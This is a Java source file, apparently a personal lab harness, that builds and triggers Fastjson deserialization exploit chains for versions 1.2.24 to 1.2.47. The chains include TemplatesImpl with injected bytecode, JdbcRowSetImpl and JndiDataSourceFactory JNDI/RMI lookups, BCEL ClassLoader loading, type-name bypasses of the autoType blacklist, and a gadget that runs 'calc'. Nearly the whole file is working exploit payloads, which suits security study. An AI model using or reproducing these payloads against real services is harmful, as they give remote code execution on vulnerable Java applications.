package com.endlessshw.fastjsonprinciple.client;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.springframework.util.FileCopyUtils;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.util.Arrays;
import java.util.Base64;

/**
 * @author hasee
 * @version 1.0
 * @description: TODO
 * @date 2023/5/15 11:07
 */
public class Fastjson1_2_24 {
    public static void main(String[] args) throws Exception{
        // TemplatesImpl 链
        // TemplatesImplGadget();

        // 有版本限制、依赖限制、而且需要出网
        // JdbcRowSetImplGadget();

        // 8u251 之前
        // ClassLoaderGadget();

        // 1.2.25 - 47 通杀
        // Bypass1_2_25_JNDI();
        // Bypass1_2_25_BCEL();

        // 1.2.25 - 1.2.41 通杀
        // Fastjson_1_2_41_Gadget();

        // Fastjson_1_2_42_Gadget();

        // Fastjson_1_2_43_Gadget();

        // JndiDataSourceFactoryGadget();

        ThrowableGadget();

    }

    // 版本问题，jdk8u65

    /**
     * 1.2.25 - 1.2.47 的通杀链
     *
     */
    private static void Bypass1_2_25_JNDI() {
        // 测试一下高版本开启 autoType 下这个链是否能执行
        // ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{{\"@type\":\"java.lang.Class\", \"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
                "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"DataSourceName\":\"rmi://127.0.0.1:1099/myRemote\", \"autoCommit\":0}}";
        System.out.println(payload);
        JSON.parse(payload);
    }

    /**
     * 失败
     * @throws IOException
     */
    private static void Bypass1_2_25_BCEL() throws IOException {
        ClassLoader classLoader = new ClassLoader();
        byte[] bytes = fileToBinArray(new File("target/classes/com.endlessshw.fastjsonprinciple.Evil.class"));
        String code = Utility.encode(bytes, true);

        String payload = "{{\"@type\":\"java.lang.Class\", \"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}," +
                "{\"@type\":\"java.lang.Class\", \"val\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"}," +
                "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"," +
                    "\"DriverClassName\":\"$$BCEL$$" + code + "\"," +
                    "\"DriverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}}";
        System.out.println(payload);
        JSONObject jsonObject = JSON.parseObject(payload);
    }

    /**
     * 一部分是漏洞触发原理，一部分是 1.2.24 BCEL 链
     *
     * @throws IOException
     * @throws ClassNotFoundException
     * @throws InstantiationException
     * @throws IllegalAccessException
     * @throws SQLException
     */
    private static void ClassLoaderGadget() throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException {
        // com.sun.org.apache.bcel.internal.util.ClassLoader 的基本的使用方法
        ClassLoader classLoader = new ClassLoader();
        byte[] bytes = fileToBinArray(new File("target/classes/com.endlessshw.fastjsonprinciple.Evil.class"));
        String code = Utility.encode(bytes, true);
        // classLoader.loadClass("$$BCEL$$" + code).newInstance();

        // BasicDataSource basicDataSource = new BasicDataSource();
        // basicDataSource.setDriverClassLoader(classLoader);
        // basicDataSource.setDriverClassName("$$BCEL$$" + code);
        // basicDataSource.getConnection();

        // payload
        // ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"," +
                "\"DriverClassName\":\"$$BCEL$$" + code + "\"," +
                "\"DriverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}";
        System.out.println(payload);
        JSONObject jsonObject = JSON.parseObject(payload);

    }

    /**
     * 文件转字节码数组
     * @param file
     * @return
     */
    private static byte[] fileToBinArray(File file) {
        try {
            FileInputStream fileInputStream = new FileInputStream(file);
            return FileCopyUtils.copyToByteArray(fileInputStream);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private static void JdbcRowSetImplGadget() {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"DataSourceName\":\"rmi://127.0.0.1:1099/myRemote\", \"autoCommit\":false}";
        JSON.parse(payload);
    }

    private static void TemplatesImplGadget() throws Exception{
        // 1. 读取恶意类 bytes[]
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.getCtClass("com.endlessshw.serialization.util.com.endlessshw.fastjsonprinciple.Evil");
        byte[] bytes = ctClass.toBytecode();
        new TemplatesImpl();

        String payload = "{\n" +
                "\t\"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n" +
                "\t\"_bytecodes\": [\"" + Base64.getEncoder().encodeToString(bytes) + "\"],\n" +
                "\t\"_name\": \"EndlessShw\",\n" +
                "\t\"_tfactory\": {},\n" +
                "\t\"_outputProperties\": {},\n" +
                "}";
        System.out.println(payload);
        JSON.parseObject(payload, Feature.SupportNonPublicField);
    }

    private static void Fastjson_1_2_41_Gadget() {
        // ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{{\"@type\":\"java.lang.Class\", \"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
                "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\", \"DataSourceName\":\"rmi://127.0.0.1:1099/myRemote\", \"autoCommit\":0}}";
        JSON.parse(payload);
    }

    private static void Fastjson_1_2_42_Gadget() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{{\"@type\":\"java.lang.Class\", \"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
                "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\", \"DataSourceName\":\"rmi://127.0.0.1:1099/myRemote\", \"autoCommit\":0}}";
        JSON.parse(payload);
    }

    private static void Fastjson_1_2_43_Gadget() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // String payload = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[, {\"DataSourceName\":\"rmi://127.0.0.1:1099/myRemote\", \"autoCommit\":false}";
        String payload = "{{\"@type\":\"java.lang.Class\", \"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
                "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[, {\"DataSourceName\":\"rmi://127.0.0.1:1099/myRemote\", \"autoCommit\":0}}";
        System.out.println(payload);
        JSON.parse(payload);
    }

    private static void JndiDataSourceFactoryGadget() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\n" +
                "    \"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\n" +
                "    \"properties\":{\n" +
                "        \"data_source\":\"rmi://127.0.0.1:1099/myRemote\"\n" +
                "    }\n" +
                "}";
        JSON.parse(payload);
    }

    private static void ThrowableGadget() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // String payload = "{\"@type\":\"java.lang.Exception\", \"@type\":\"com.endlessshw.fastjsonprinciple.Evil\", \"command\":\"calc\"}";
        String payload = "{\"@type\":\"com.endlessshw.fastjsonprinciple.Evil\", \"command\":\"calc\"}";
        System.out.println(payload);
        JSON.parseObject(payload);
    }


}
